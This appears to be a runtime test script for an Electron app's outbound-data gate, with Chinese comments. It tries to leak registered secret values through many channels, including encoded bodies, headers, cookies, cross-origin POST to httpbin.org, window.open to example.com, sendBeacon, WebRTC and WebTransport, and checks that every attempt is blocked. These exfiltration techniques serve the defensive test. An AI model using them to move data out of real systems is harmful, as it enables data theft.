// 出域闸运行时探针:起**真实的** main.js/preload.js(electron . + CDP),在自家页面里登记真值、
// 发各种形态的请求,逐项核对"该拦的拦了、该放的放了"。任何一项不符 → 退出码 1。
//
// 跑法:npm run probe:egress(需要本机能连上 fast/app.lanwealth.com;不在 npm test 里,因为要起 Electron 与外网)
// 为什么不是 node --test 的一部分:静态看守(test/main-static.test.mjs)守的是"线接了没";
// 这里守的是 Electron 运行时"uploadData 长什么样、blob 取不取得到、ws 拦不拦得住" —— 静态看不出来。
//
// 2026-09-23 Electron 44.4.5 首跑结论(全部符合预期):
//   JSON / \uXXXX 转义 / Blob / FormData 文件 / GET 查询串 / base64 / 全角数字 / 跨域 / XHR / sendBeacon → 拦
//   ReadableStream 体 → uploadData 里出现一条既无 bytes 也无 file/blobUUID 的条目 → 走 opaque 分支 → 拦
//   自设 content-encoding → onBeforeSendHeaders 拦;wss → 拦;干净 GET/POST → 放行
//   被拦通知与主进程日志均不含真值。
// 2026-09-23 第二轮(对抗评审 high-1/2/3 后补):自定义请求头 / Cookie / window.open 外域 URL 带真值 → 拦;
//   clear() 后计数归零、真值重新放行。
// 2026-09-23 第三轮(旁路通道实测后重写):WebRTC / WebTransport 不走 webRequest,靠 PAC 黑洞 + disable_non_proxied_udp。
//   这里不再问"构造器在不在"(实测所有开关都删不掉 API),而是在本机 LAN 地址上开三个**观察者端口**
//   (TCP = TURN、UDP = STUN、UDP = WebTransport 的 QUIC 握手),先用 scripts/probe-control-main.js(无闸的最小壳)
//   证明页面脚本能让这三个端口收到字节(阳性对照),再用真 main.js 跑同一段脚本要求三个端口一个字节都收不到。
//   对照不成立(比如这台机器的系统代理不绕过局域网)→ 探针如实报「对照不成立」并失败,不会把"没测到"当"封住了"。
//   首跑:对照 tcp=1 conn / stun=N 包 / quic=N 包;真壳 全 0,candidates NONE,WebTransport 主线程与 Worker 都 FAIL。
import { spawn } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import net from 'node:net'
import dgram from 'node:dgram'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const SHELL = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const electronBin = path.join(SHELL, 'node_modules/.bin/electron')
const sleep = ms => new Promise(r => setTimeout(r, ms))

// ── 起一个 Electron(真壳或对照壳)并接上 CDP ──
function launch(mainArg) {
  const UD = fs.mkdtempSync(path.join(os.tmpdir(), 'bayze-egress-probe-'))
  const PORT = 9333 + Math.floor(Math.random() * 500)
  const child = spawn(electronBin, [mainArg, `--remote-debugging-port=${PORT}`, `--user-data-dir=${UD}`], { cwd: SHELL, stdio: ['ignore', 'pipe', 'pipe'] })
  const h = { child, UD, PORT, log: '' }
  child.stdout.on('data', d => { h.log += d })
  child.stderr.on('data', d => { h.log += d })
  h.getPage = async () => {
    for (let i = 0; i < 60; i++) {
      try {
        const list = await (await fetch(`http://127.0.0.1:${PORT}/json`)).json()
        const pg = list.find(t => t.type === 'page' && /lanwealth\.com/.test(t.url))
        if (pg) return pg
      } catch { /* not up yet */ }
      await sleep(1000)
    }
    throw new Error('page target not found; log:\n' + h.log)
  }
  h.connect = async () => {
    const pg = await h.getPage()
    const ws = new WebSocket(pg.webSocketDebuggerUrl)
    await new Promise((res, rej) => { ws.onopen = res; ws.onerror = rej })
    let seq = 0
    const pending = new Map()
    ws.onmessage = ev => { const m = JSON.parse(ev.data); if (m.id && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id) } }
    const cdp = (method, params = {}) => new Promise(res => { const id = ++seq; pending.set(id, res); ws.send(JSON.stringify({ id, method, params })) })
    h.ws = ws
    h.evalIn = async (expr) => {
      const r = await cdp('Runtime.evaluate', { expression: expr, awaitPromise: true, returnByValue: true })
      if (r.result?.exceptionDetails) return 'THREW ' + (r.result.exceptionDetails.exception?.description || r.result.exceptionDetails.text)
      return r.result?.result?.value
    }
    return pg
  }
  h.stop = async () => { try { h.ws?.close() } catch { /* already closed */ } child.kill('SIGTERM'); await sleep(800); fs.rmSync(UD, { recursive: true, force: true }) }
  return h
}

// ── 观察者:本机 LAN 地址上的 TCP(TURN)/ UDP(STUN)/ UDP(WebTransport QUIC)端口,只数字节不应答 ──
const lanIp = Object.values(os.networkInterfaces()).flat().find(i => i && i.family === 'IPv4' && !i.internal)?.address
const OBS_PORT = 3478 + Math.floor(Math.random() * 1000)
const WT_PORT = OBS_PORT + 1
const seen = { tcpConns: 0, tcpBytes: 0, stunPkts: 0, quicPkts: 0 }
const resetSeen = () => { seen.tcpConns = 0; seen.tcpBytes = 0; seen.stunPkts = 0; seen.quicPkts = 0 }
const tcpObs = net.createServer(sock => { seen.tcpConns++; sock.on('data', d => { seen.tcpBytes += d.length }); sock.on('error', () => {}) })
const stunObs = dgram.createSocket('udp4'); stunObs.on('message', () => { seen.stunPkts++ }); stunObs.on('error', () => {})
const quicObs = dgram.createSocket('udp4'); quicObs.on('message', () => { seen.quicPkts++ }); quicObs.on('error', () => {})
await new Promise(res => tcpObs.listen(OBS_PORT, '0.0.0.0', res))
await new Promise(res => stunObs.bind(OBS_PORT, '0.0.0.0', res))
await new Promise(res => quicObs.bind(WT_PORT, '0.0.0.0', res))
const CHANNELS = `(async () => {
  const out = {}
  try {
    const pc = new RTCPeerConnection({ iceServers: [
      { urls: 'stun:${lanIp}:${OBS_PORT}' },
      { urls: 'turn:${lanIp}:${OBS_PORT}?transport=tcp', username: 'u', credential: 'p' } ] })
    const cands = [], errs = []
    pc.onicecandidate = e => { if (e.candidate) cands.push(e.candidate.type + '/' + e.candidate.protocol) }
    pc.onicecandidateerror = e => errs.push(e.errorCode)
    pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer())
    await new Promise(res => { const t = setTimeout(res, 6000); pc.onicegatheringstatechange = () => { if (pc.iceGatheringState === 'complete') { clearTimeout(t); res() } } })
    pc.close(); out.cands = cands.join(',') || 'NONE'; out.iceErrors = errs.join(',') || '-'
  } catch (e) { out.cands = 'THROW ' + e.name }
  const wt = async (u) => { try { const t = new WebTransport(u); await Promise.race([t.ready, new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 3000))]); return 'READY' } catch (e) { return 'FAIL ' + String(e && e.message).slice(0, 32) } }
  out.wt = await wt('https://${lanIp}:${WT_PORT}/x')
  try {
    const src = 'const wt=' + wt.toString() + '; wt("https://${lanIp}:${WT_PORT}/w").then(r => postMessage(r))'
    const w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' })))
    out.wtWorker = await new Promise(res => { const t = setTimeout(() => res('timeout'), 6000); w.onmessage = e => { clearTimeout(t); res(e.data) }; w.onerror = () => { clearTimeout(t); res('WORKER-ERROR') } })
  } catch (e) { out.wtWorker = 'THROW ' + e.name }
  return JSON.stringify(out)
})()`

let failures = 0
const expect = (name, got, want) => {
  const ok = typeof want === 'function' ? want(got) : String(got).includes(want)
  if (!ok) failures++
  console.log(`${ok ? '✔' : '✖'} ${name.padEnd(34)} ${got}`)
}

const shell = launch('.')
try {
  // ── 阳性对照:无闸的最小壳必须让三个观察者端口都收到字节 ──
  if (!lanIp) { expect('阳性对照:需要一个非 loopback 的 IPv4 地址', 'none', 'x') } else {
    const ctl = launch(path.join('scripts', 'probe-control-main.js'))
    try {
      await ctl.connect(); await sleep(1500)
      const r = JSON.parse(await ctl.evalIn(CHANNELS)); await sleep(800)
      console.log(`对照壳 @${lanIp}:${OBS_PORT}/${WT_PORT}:`, JSON.stringify(r), JSON.stringify(seen))
      expect('对照:TURN/TCP 观察者收到连接', seen.tcpConns, v => v >= 1)
      expect('对照:STUN/UDP 观察者收到包', seen.stunPkts, v => v >= 1)
      expect('对照:WebTransport QUIC 观察者收到包', seen.quicPkts, v => v >= 1)
      expect('对照:Worker 里的 WebTransport 也发出了握手', r.wtWorker, v => v !== 'timeout' && v !== 'THROW')
    } finally { await ctl.stop() }
  }
  resetSeen()

  const pg = await shell.connect()
  const { evalIn } = shell
  const child = shell.child
  const getLog = () => shell.log
  console.log('page:', pg.url)

  await sleep(4000)
  await evalIn(`(async () => { await new Promise(r => document.readyState === 'complete' ? r() : window.addEventListener('load', r)); return 1 })()`)

  const SECRET = '恒康集团'
  await evalIn(`
    window.__blocked = [];
    window.__sub = window.electronApp.secretEgress.onBlocked(i => window.__blocked.push(i));
    window.__try = async (fn) => {
      try { const r = await fn(); return 'ALLOWED status=' + (r && r.status) }
      catch (e) { return 'BLOCKED ' + (e && e.message) }
    }; 1`)
  const post = (bodyExpr, extra = '') => `window.__try(() => fetch(location.origin + '/api/app-config', { method: 'POST', ${extra} body: ${bodyExpr} }))`

  expect('status:未登记', JSON.stringify(await evalIn(`window.electronApp.secretEgress.status()`)), '"count":0')
  expect('未登记时 POST 含真值 → 放行', await evalIn(post(`'${SECRET}'`)), 'ALLOWED')
  expect('register 返回新增数', await evalIn(`window.electronApp.secretEgress.register([{ original: '${SECRET}', label: '客户', kind: 'entity' }, { original: '128.5万', label: '金额', kind: 'money' }])`), v => v === 2)
  expect('status:已登记 2 条', JSON.stringify(await evalIn(`window.electronApp.secretEgress.status()`)), '"count":2')
  expect('JSON 体含真值', await evalIn(post(`JSON.stringify({ q: '${SECRET}' })`)), 'BLOCKED')
  expect('JSON \\u 转义真值', await evalIn(post(`'{"q":"' + '${SECRET}'.split('').map(c => '\\\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join('') + '"}'`)), 'BLOCKED')
  expect('Blob 体含真值', await evalIn(post(`new Blob(['报价给 ${SECRET}'], { type: 'text/plain' })`)), 'BLOCKED')
  expect('FormData 文件含真值', await evalIn(`window.__try(() => { const fd = new FormData(); fd.append('f', new File(['x ${SECRET} y'], 'a.txt')); return fetch(location.origin + '/api/app-config', { method: 'POST', body: fd }) })`), 'BLOCKED')
  expect('GET 查询串含真值', await evalIn(`window.__try(() => fetch(location.origin + '/api/app-config?q=' + encodeURIComponent('${SECRET}')))`), 'BLOCKED')
  expect('base64 包裹真值', await evalIn(post(`JSON.stringify({ p: btoa(unescape(encodeURIComponent('客户是${SECRET},报价见附件'))) })`)), 'BLOCKED')
  expect('全角数字 １２８．５万', await evalIn(post(`'报价 １２８．５万'`)), 'BLOCKED')
  expect('跨域 POST 含真值', await evalIn(`window.__try(() => fetch('https://httpbin.org/post', { method: 'POST', mode: 'no-cors', body: '${SECRET}' }))`), 'BLOCKED')
  expect('ReadableStream 体含真值', await evalIn(post(`new ReadableStream({ start(c) { c.enqueue(new TextEncoder().encode('${SECRET}')); c.close() } })`, `duplex: 'half',`)), 'BLOCKED')
  expect('XHR 含真值', await evalIn(`new Promise(res => { const x = new XMLHttpRequest(); x.open('POST', location.origin + '/api/app-config'); x.onload = () => res('ALLOWED ' + x.status); x.onerror = () => res('BLOCKED'); x.send('${SECRET}') })`), 'BLOCKED')
  expect('自设 content-encoding(干净体)', await evalIn(post(`'x'`, `headers: { 'content-encoding': 'gzip' },`)), 'BLOCKED')
  expect('wss 连接', await evalIn(`new Promise(res => { const w = new WebSocket('wss://' + location.host + '/probe'); w.onopen = () => res('OPENED'); w.onerror = () => res('BLOCKED'); w.onclose = e => res('CLOSED ' + e.code) })`), 'BLOCKED')
  // ── 第二轮:对抗评审抓出的六条出口 ──
  expect('自定义请求头带真值', await evalIn(post(`'x'`, `headers: { 'x-note': encodeURIComponent('${SECRET}') },`)), 'BLOCKED')
  await evalIn(`document.cookie = 'probe=' + encodeURIComponent('${SECRET}') + '; path=/'`)
  expect('Cookie 带真值', await evalIn(post(`'x'`)), 'BLOCKED')
  await evalIn(`document.cookie = 'probe=; max-age=0; path=/'`)
  expect('清掉 Cookie 后干净 POST 恢复放行', await evalIn(post(`'x'`)), 'ALLOWED')
  const extBefore = await evalIn(`window.__blocked.length`)
  await evalIn(`window.open('https://example.com/?q=' + encodeURIComponent('${SECRET}'))`)
  await sleep(800)
  expect('window.open 外域带真值(看通知 +1,method=EXTERNAL)', await evalIn(`JSON.stringify(window.__blocked.slice(-1)[0]||{})`), v => v.includes('"method":"EXTERNAL"'))
  expect('window.open 外域带真值(通知数+1)', await evalIn(`window.__blocked.length`) - extBefore, v => v === 1)
  // ── 第三轮:旁路通道 —— 同一段脚本在真壳里,三个观察者端口必须一个字节都收不到 ──
  if (lanIp) {
    const ch = JSON.parse(await evalIn(CHANNELS)); await sleep(800)
    console.log('真壳:', JSON.stringify(ch), JSON.stringify(seen))
    expect('WebRTC:ICE 候选归零(UDP 策略 + PAC)', ch.cands, 'NONE')
    expect('WebRTC:TURN/TCP 观察者零连接', seen.tcpConns, v => v === 0)
    expect('WebRTC:STUN/UDP 观察者零包', seen.stunPkts, v => v === 0)
    // ⚠️ 下面两条 FAIL 本身不判别(对不应答的端口,没有闸也会超时失败);判别的是紧接着的 QUIC 观察者零包 ——
    //    探红实录:去掉 PAC + UDP 策略后 quicPkts=11、tcpConns=1、stunPkts=5、cands=host/udp 四项红,这两条仍绿。
    expect('WebTransport:主线程失败(不判别)', ch.wt, 'FAIL')
    expect('WebTransport:Worker 失败(不判别)', ch.wtWorker, 'FAIL')
    expect('WebTransport:QUIC 观察者零包(判别)', seen.quicPkts, v => v === 0)
  }
  expect('干净 POST → 放行', await evalIn(post(`JSON.stringify({ q: '⟦客户-KX⟧ 138.5万' })`)), 'ALLOWED')
  expect('干净 GET → 放行', await evalIn(`window.__try(() => fetch(location.origin + '/api/app-config'))`), 'ALLOWED status=200')
  const beaconBefore = await evalIn(`window.__blocked.length`)
  await evalIn(`navigator.sendBeacon(location.origin + '/api/app-config', '${SECRET}')`)
  await sleep(1500)
  expect('sendBeacon 含真值(看通知数+1)', await evalIn(`window.__blocked.length`) - beaconBefore, v => v === 1)
  const blocked = await evalIn(`JSON.stringify(window.__blocked)`)
  expect('被拦通知条数', JSON.parse(blocked).length, v => v === 16)   // 12 条 fetch/XHR/ws 型 + 1 条 beacon + 头/Cookie/外开 3 条
  expect('通知只带 label/kind/method/path', JSON.parse(blocked).every(i => Object.keys(i).sort().join() === 'kind,label,method,path'), v => v === true)
  expect('通知里无真值', blocked.includes(SECRET) ? 'LEAK' : 'clean', 'clean')
  expect('主进程日志无真值', getLog().includes(SECRET) ? 'LEAK' : 'clean', 'clean')
  expect('主进程日志有拦截记录', (getLog().match(/\[egress\] 已拦截/g) || []).length, v => v >= 16)
  // clear:登出/换账号路径 —— 计数归零、之前被拦的真值重新放行
  expect('clear 后计数归零', JSON.stringify(await evalIn(`window.electronApp.secretEgress.clear()`)), '"count":0')
  expect('clear 后原真值放行', await evalIn(post(`JSON.stringify({ q: '${SECRET}' })`)), 'ALLOWED')
  void child
} finally {
  await shell.stop()
  tcpObs.close(); stunObs.close(); quicObs.close()
}
console.log(failures ? `\n✖ ${failures} 项不符` : '\n✔ 全部符合预期')
process.exit(failures ? 1 : 0)
